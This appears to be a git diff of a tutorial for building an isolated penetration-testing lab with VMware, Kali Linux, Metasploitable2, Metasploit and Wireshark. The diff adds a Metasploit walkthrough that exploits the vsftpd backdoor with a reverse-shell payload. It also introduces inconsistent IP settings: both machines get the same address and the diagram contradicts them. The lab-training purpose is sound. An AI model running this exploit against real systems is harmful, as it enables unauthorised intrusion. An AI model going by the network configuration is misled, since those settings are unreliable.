@@ -100,7 +100,7 @@ Before installing VMware, ensure hardware virtualization is enabled in your syst
 
 1. **Locate the downloaded installer** in your Downloads folder
 
-2. **Right-click** the installer file (`VMware-workstation-full-xx.x.x-xxxxxxx.exe`)
+2. **Right-click** the installer file (`VMware-workstation-full-17.6.0-24238078.exe`)
 
 3. Select **"Run as administrator"**
 
@@ -118,9 +118,7 @@ Before installing VMware, ensure hardware virtualization is enabled in your syst
 
    **c. Installation Directory**
    - Keep the default installation path or click **Change** to select a custom location:
-     ```
-     Default: C:\Program Files (x86)\VMware\VMware Workstation\
-     ```
+    
    - Click **Next**
 
    **d. User Experience Settings**
@@ -252,7 +250,7 @@ Before installing VMware, ensure hardware virtualization is enabled in your syst
     - Click **"Customize Hardware"** to make any final adjustments (optional)
     - Click **Finish**
 
-**Screenshot Reference:** `screenshots/kali-vm-created.png`
+<img width="496" height="527" alt="Image" src="https://github.com/user-attachments/assets/ac5ee3c6-6402-4616-a4c2-db88459a5337" />
 
 ***
 
@@ -264,7 +262,7 @@ Before installing VMware, ensure hardware virtualization is enabled in your syst
    - Select **"Graphical Install"** (recommended)
    - Press **Enter**
 
-**Screenshot Reference:** `screenshots/kali-boot-menu.png`
+<img width="654" height="497" alt="Image" src="https://github.com/user-attachments/assets/4885ffb1-f622-4a5b-a283-903763debdf1" />
 
 3. **Language Selection:**
    - Select your preferred language (e.g., **English**)
@@ -279,16 +277,16 @@ Before installing VMware, ensure hardware virtualization is enabled in your syst
    - Click **Continue**
 
 6. **Network Configuration:**
-   - Hostname: Enter a name (e.g., `kali-lab`)
+   - Hostname: Enter a name (e.g., `ashborn`)
    - Click **Continue**
 
 7. **Domain Name:**
-   - Leave blank or enter a domain (e.g., `local`)
+   - Leave blank or enter a domain (e.g., `oriphus`)
    - Click **Continue**
 
 8. **User Account Setup:**
-   - Full name: Your name
-   - Username: `kali` (recommended)
+   - Full name: `shadax`
+   - Username: `shadax` (recommended)
    - Password: Create a strong password
    - Re-enter password
    - Click **Continue**
@@ -336,7 +334,7 @@ sudo apt update && sudo apt upgrade -y
 sudo apt dist-upgrade -y
 ```
 
-**Screenshot Reference:** `screenshots/kali-system-update.png`
+<img width="1919" height="1023" alt="Image" src="https://github.com/user-attachments/assets/7f8aa847-3081-4c4e-ac76-87e601aa8b4d" />
 
 ***
 
@@ -357,70 +355,255 @@ sudo apt dist-upgrade -y
    - Select **"Extract All"** or use 7-Zip/WinRAR
    - Choose destination folder (e.g., `C:\Virtual Machines\Metasploitable2\`)
 
-**Screenshot Reference:** `screenshots/metasploitable2-extracted-files.png`
+<img width="665" height="489" alt="Image" src="https://github.com/user-attachments/assets/c9d07bcb-f9e1-4584-b4f3-94e0cc175c7b" />
+# Installing Metasploit Framework in Kali Linux
 
-***
+This guide provides comprehensive step-by-step instructions to install and configure the Metasploit Framework on Kali Linux.
 
-### Import Metasploitable2 into VMware
+## Overview
 
-1. **Open VMware Workstation Pro**
+Metasploit Framework comes **pre-installed** on Kali Linux 2.0 and later versions. However, this guide covers verification, installation, and setup procedures.
 
-2. Click **File → Open**
+---
 
-3. Navigate to the extracted Metasploitable2 folder
+## Quick Start
 
-4. Select the file: **`Metasploitable.vmx`**
+If Metasploit is already installed, simply run:
 
-5. Click **Open**
+```bash
+msfconsole
+```
 
-6. Metasploitable2 VM will appear in your VM library
+The Metasploit console will launch with the framework banner.
 
-**Screenshot Reference:** `screenshots/metasploitable2-imported.png`
+---
 
-***
+## Installation Steps
 
-### Configure Metasploitable2 Settings
+### Step 1: Update Package Repositories
 
-1. **Right-click** on Metasploitable2 VM
+Open a terminal and update your package list:
 
-2. Select **"Settings"**
+```bash
+sudo apt-get update
+```
 
-3. **Memory:**
-   - Recommended: **512 MB** (default is fine)
+This ensures you have access to the latest Metasploit packages available in Kali repositories.
 
-4. **Network Adapter:**
-   - **Important**: Change from NAT to **"Host-only"** (we'll configure this in Step 4)
-   - Click **OK**
+### Step 2: Install Metasploit Framework
 
-**Screenshot Reference:** `screenshots/metasploitable2-settings.png`
+Install Metasploit Framework using the apt package manager:
 
-***
+```bash
+sudo apt-get install metasploit-framework
+```
+<img width="665" height="489" alt="Image" src="https://github.com/user-attachments/assets/5589171c-0c5f-4cdd-9c2d-8e9c8ae9c21e" />
 
-### Start Metasploitable2
+The system will:
+- Download Metasploit Framework
+- Install all required dependencies (Ruby, PostgreSQL, etc.)
+- Configure the framework automatically
 
-1. **Select** Metasploitable2 VM
+### Step 3: Verify Installation
 
-2. Click **"Power on this virtual machine"**
+Confirm successful installation by checking the Metasploit version:
 
-3. If prompted with **"I copied it"** or **"I moved it"**, select **"I copied it"**
+```bash
+msfconsole --version
+```
 
-4. **Login Screen** will appear:
-   - **Username**: `msfadmin`
-   - **Password**: `msfadmin`
+<img width="244" height="66" alt="Image" src="https://github.com/user-attachments/assets/9031e41e-150a-4514-88c6-c7d3e684d4ef" />
 
-5. **Verify Installation** by checking IP address:
-   ```bash
-   ifconfig
-   ```
-   You should see network interface details with an IP address
+### Step 4: Start PostgreSQL Service
 
-**Screenshot Reference:** `screenshots/metasploitable2-login.png`
+PostgreSQL database is required for Metasploit to function properly.
 
-***
+Start the PostgreSQL service:
 
-# Step 4: Network Configuration (Host-Only Adapter)
+```bash
+sudo /etc/init.d/postgresql start
+```
 
-Creating a Host-Only network ensures your penetration testing lab is **isolated from the internet** and external networks, preventing accidental attacks on production systems.
+Check the status:
+
+```bash
+sudo /etc/init.d/postgresql status
+```
+
+Expected output: `online` or `running` status
+
+<img width="746" height="321" alt="Image" src="https://github.com/user-attachments/assets/881544e4-fa06-4e84-9742-edda8700e349" />
+
+### Step 5: Initialize Metasploit Database
+
+Launch Metasploit for the first time:
+
+```bash
+msfconsole
+```
+
+On first launch, you'll be prompted to set up the initial database:
+
+```
+[*] Metasploit Path: /usr/share/metasploit-framework
+[*] Databases: postgres
+
+Do you want to set up the initial database? [y/N]:
+```
+
+Type **y** and press **Enter**. The system will automatically:
+- Create the database structure
+- Initialize exploit tables
+- Configure the connection
+
+This process may take 1-2 minutes on first run.
+
+<img width="696" height="788" alt="image" src="https://github.com/user-attachments/assets/e5969e2c-1aca-4f12-b56b-94c3947a3bbe" />
+<img width="605" height="184" alt="image" src="https://github.com/user-attachments/assets/457b7482-a7e1-4185-acf9-2d63b97986bd" />
+
+
+### Step 6: Verify Database Connection
+
+Once msfconsole launches successfully, you'll see:
+
+```
+[*] Connected to msf. Connection type: postgresql.
+```
+
+You are now ready to use Metasploit!
+
+---
+
+## Starting Metasploit
+
+### Standard Launch
+
+Open a terminal and run:
+
+```bash
+msfconsole
+```
+
+### Quiet Mode (No Banner)
+
+To launch without the banner display:
+
+```bash
+msfconsole -q
+```
+
+### With Database Connection Status
+
+```bash
+msfconsole -d postgresql://user:password@localhost:5432/msf
+```
+
+<img width="633" height="624" alt="image" src="https://github.com/user-attachments/assets/b3ecaa45-6e09-4055-ab91-b100bf438988" />
+
+---
+
+---
+
+## Basic Metasploit Commands
+
+Once msfconsole is running, use these commands:
+
+| Command | Purpose |
+|---------|---------|
+| `search <keyword>` | Search for exploits, payloads, or auxiliary modules |
+| `use <module_name>` | Select a specific exploit or module |
+| `set RHOST <ip>` | Set the target/remote host IP address |
+| `set LHOST <ip>` | Set the local/listener IP address |
+| `set LPORT <port>` | Set the listener port number |
+| `set PAYLOAD <payload>` | Select a payload type |
+| `options` or `show options` | Display configurable options for current module |
+| `run` or `exploit` | Execute the selected exploit or module |
+| `back` | Return to main menu |
+| `exit` or `quit` | Exit Metasploit console |
+| `help` | Display help information |
+
+---
+
+## Practical Example: Exploiting vsftpd Backdoor
+
+This example demonstrates exploiting a vulnerable FTP service on Metasploitable2:
+
+```bash
+# Start msfconsole
+msfconsole
+
+# Search for vsftpd exploits
+msf > search vsftpd
+
+# Use the vsftpd backdoor exploit
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+
+# View required options
+msf > show options
+
+# Set the target host IP (replace with actual Metasploitable2 IP)
+msf > set RHOST 192.168.10.5
+
+# Set the payload
+  msf > set PAYLOAD cmd/unix/reverse
+
+# Set your listener host
+msf > set LHOST 192.168.10.3
+
+# Run the exploit
+msf > exploit
+```
+
+<img width="1281" height="801" alt="image" src="https://github.com/user-attachments/assets/8710f068-fc00-4c05-b0e9-cf2a699981ae" />
+<img width="996" height="158" alt="image" src="https://github.com/user-attachments/assets/46b0d56d-2e13-4a7a-b514-7773348234ce" />
+
+---
+
+## Troubleshooting
+
+### Issue: "Database connection failed"
+
+**Solution:** Start PostgreSQL service:
+
+```bash
+sudo /etc/init.d/postgresql start
+```
+
+Then relaunch msfconsole.
+
+### Issue: "Permission denied" errors
+
+**Solution:** Ensure you're running with sudo privileges:
+
+```bash
+sudo msfconsole
+```
+
+### Issue: Metasploit not found or not installed
+
+**Solution:** Reinstall Metasploit Framework:
+
+```bash
+sudo apt-get update
+sudo apt-get install metasploit-framework
+```
+
+### Issue: Slow database performance
+
+**Solution:** Rebuild the database:
+
+```bash
+msfconsole
+msf > db_rebuild
+```
+
+### Issue: Port already in use
+
+**Solution:** Change the listener port:
+
+```bash
+msf > set LPORT 4445
+```
 
 ### Create Host-Only Network in VMware
 
@@ -440,7 +623,7 @@ Creating a Host-Only network ensures your penetration testing lab is **isolated 
    - Network Name: **VMnet2** (or your chosen network)
    - Type: Select **"Host-only"**
    - ✓ **Connect a host virtual adapter to this network**
-   - Subnet IP: **192.168.100.0**
+   - Subnet IP: **10.10.169.194**
    - Subnet mask: **255.255.255.0**
 
 8. **DHCP Settings** (Optional):
@@ -454,7 +637,7 @@ Creating a Host-Only network ensures your penetration testing lab is **isolated 
 
 11. Click **OK** to close Virtual Network Editor
 
-**Screenshot Reference:** `screenshots/vmware-hostonly-network.png`
+<img width="693" height="649" alt="image" src="https://github.com/user-attachments/assets/de6e5175-2bde-49e4-9f74-e692f435131f" />
 
 ***
 
@@ -490,7 +673,7 @@ Creating a Host-Only network ensures your penetration testing lab is **isolated 
    ```
    auto eth0
    iface eth0 inet static
-       address 192.168.100.10
+       address 10.10.169.194 
        netmask 255.255.255.0
    ```
 
@@ -498,8 +681,6 @@ Creating a Host-Only network ensures your penetration testing lab is **isolated 
    ```bash
    sudo systemctl restart networking
    ```
-
-**Screenshot Reference:** `screenshots/kali-network-config.png`
 
 ***
 
@@ -526,7 +707,7 @@ Creating a Host-Only network ensures your penetration testing lab is **isolated 
    ```
    auto eth0
    iface eth0 inet static
-       address 192.168.100.100
+       address 10.10.169.194 
        netmask 255.255.255.0
    ```
 
@@ -541,9 +722,7 @@ Creating a Host-Only network ensures your penetration testing lab is **isolated 
    ```bash
    ifconfig
    ```
-   Should show: `192.168.100.100`
-
-**Screenshot Reference:** `screenshots/metasploitable2-network-config.png`
+   Should show: `10.10.169.194`
 
 ***
 
@@ -552,12 +731,12 @@ Creating a Host-Only network ensures your penetration testing lab is **isolated 
 From **Kali Linux**, test connection to Metasploitable2:
 
 ```bash
-ping 192.168.100.100
+ping 10.10.169.194 
 ```
 
 You should see successful ping responses
 
-**Screenshot Reference:** `screenshots/ping-test-success.png`
+<img width="618" height="807" alt="image" src="https://github.com/user-attachments/assets/0e51b076-fe54-424a-abc2-8b1124bfcf93" />
 
 ***
 
@@ -568,24 +747,22 @@ You should see successful ping responses
 │         Host Computer (Windows)          │
 │                                          │
 │  VMware Virtual Network (VMnet2)         │
-│  Network: 192.168.100.0/24               │
+│  Network: 10.10.169.0/24               │
 │  Type: Host-Only (Isolated)              │
 └──────────────┬───────────────┬──────────┘
                │               │
        ┌───────▼──────┐  ┌────▼─────────┐
        │ Kali Linux   │  │Metasploitable│
        │              │  │      2       │
-       │192.168.100.10│  │192.168.100   │
+       │ 10.10.169.194│  │192.168.100   │
        │              │  │     .100     │
        │(Attacker VM) │  │ (Target VM)  │
        └──────────────┘  └──────────────┘
 ```
 
-**Screenshot Reference:** Save this as `screenshots/network-topology-diagram.png`
-
 ***
 
-# Troubleshooting
+## Troubleshooting
 
 ### Issue 1: "Virtualization is disabled in BIOS"
 
@@ -714,22 +891,6 @@ Then reinstall VMware
 
 ***
 
-### Issue 8: "Host-only adapter not working"
-
-**Solution:**
-
-1. **Recreate the host-only network:**
-   - Edit → Virtual Network Editor
-   - Delete existing host-only network
-   - Click "Add Network"
-   - Configure new host-only adapter
-
-2. **Reset VMware networking:**
-   ```cmd
-   "C:\Program Files (x86)\VMware\VMware Workstation\vmnetcfg.exe"
-   ```
-   Click "Restore Defaults"
-
 ---
 
 ### Issue 9: "Shared folders not working"
@@ -746,7 +907,6 @@ Then reinstall VMware
    - Add folder path
 
 ***
-
 ---
 
 # 2. Linux Commands Cheat Sheet
@@ -1057,6 +1217,8 @@ wireshark
 ```
 Or find it in Applications → Sniffing & Spoofing → Wireshark
 
+<img width="1677" height="815" alt="Image" src="https://github.com/user-attachments/assets/e20a8360-db0e-418e-a818-5da070bb6794" />
+
 ---
 
 ## Basic Usage
@@ -1079,6 +1241,8 @@ When you launch Wireshark, you'll see a list of available network interfaces:
 - Or go to **Capture → Start**
 
 Wireshark will immediately begin capturing all packets on the selected interface.
+
+<img width="1919" height="879" alt="Image" src="https://github.com/user-attachments/assets/41a3f17c-9525-4908-a911-b8205b085118" />
 
 ### 3. Apply Filters
 
